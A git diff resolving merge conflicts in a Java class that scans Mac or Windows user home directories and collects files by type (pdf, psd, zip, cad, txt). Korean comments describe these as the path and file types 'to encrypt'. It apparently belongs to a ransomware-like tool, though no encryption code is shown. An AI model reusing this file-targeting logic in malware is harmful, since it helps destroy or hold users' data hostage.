@@ -11,7 +11,7 @@ import java.util.List;
  */
 public class SearchDirectory {
 
-<<<<<<< HEAD
+
     private String defaultDirectiory;
 
     private ArrayList<File> allFiles = new ArrayList<>();
@@ -19,13 +19,6 @@ public class SearchDirectory {
 
     private ArrayList<String> containsfilters = new ArrayList<>();
 
-=======
-    private boolean isWindow;
-    private String defaultDirectory;
-    private List<File> allFiles = new ArrayList<>();
-    private List<String> containsfilters = new ArrayList<>();
-    private int filecounts = 0;
->>>>>>> origin/master
 
     public SearchDirectory()
     {
@@ -40,13 +33,6 @@ public class SearchDirectory {
         setDefaultDirectory("/Users/codertimo/Desktop/test/");
  //        setDefaultDirectiory();
 
-<<<<<<< HEAD
-=======
-        //1. 암호화 할 경로 설정
-        setDefaultDirectory("C:\\test");
-        //setDefaultDirectory();
->>>>>>> origin/master
-
         //2. 암호화할 파일 타입을 설정
         initContainFilter();
 
@@ -56,16 +42,10 @@ public class SearchDirectory {
     {
 
         System.out.println("디렉토리 검색 시작");
-<<<<<<< HEAD
 
         System.out.println(defaultDirectiory);
 
         getFileList(defaultDirectiory);
-
-=======
-        System.out.println(defaultDirectory);
-        subDirList(defaultDirectory);
->>>>>>> origin/master
         System.out.println("디렉토리 검색 끝");
 
         return allFiles;
@@ -101,12 +81,8 @@ public class SearchDirectory {
         containsfilters.add("max");
         containsfilters.add("cad");
         containsfilters.add("zip");
-<<<<<<< HEAD
         containsfilters.add("pdf");
         containsfilters.add("psd");
-=======
-        containsfilters.add("txt");
->>>>>>> origin/master
     }
 
 
@@ -119,10 +95,6 @@ public class SearchDirectory {
         switch (os)
         {
             case "Mac":
-<<<<<<< HEAD
-=======
-                isWindow = false;
->>>>>>> origin/master
                 setMacDefaultDirectory();
                 break;
 
@@ -138,11 +110,7 @@ public class SearchDirectory {
      */
     private void setDefaultDirectory(String defaultDirectory)
     {
-<<<<<<< HEAD
         this.defaultDirectiory = defaultDirectory;
-=======
-        this.defaultDirectory = defaultDirectory;
->>>>>>> origin/master
     }
 
     /**
@@ -158,7 +126,7 @@ public class SearchDirectory {
                     System.out.println(file.getName());
                     if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
                     {
-                        this.defaultDirectory = file.getCanonicalPath();
+                        this.defaultDirectiory = file.getCanonicalPath();
                     }
                 }
             }
@@ -180,11 +148,7 @@ public class SearchDirectory {
             if (fileList != null) {
                 for (File file : fileList) {
                     if (!file.getName().equals("Public")) {
-<<<<<<< HEAD
                         this.defaultDirectiory= file.getCanonicalPath();
-=======
-                        this.defaultDirectory = file.getCanonicalPath();
->>>>>>> origin/master
                     }
                 }
             }
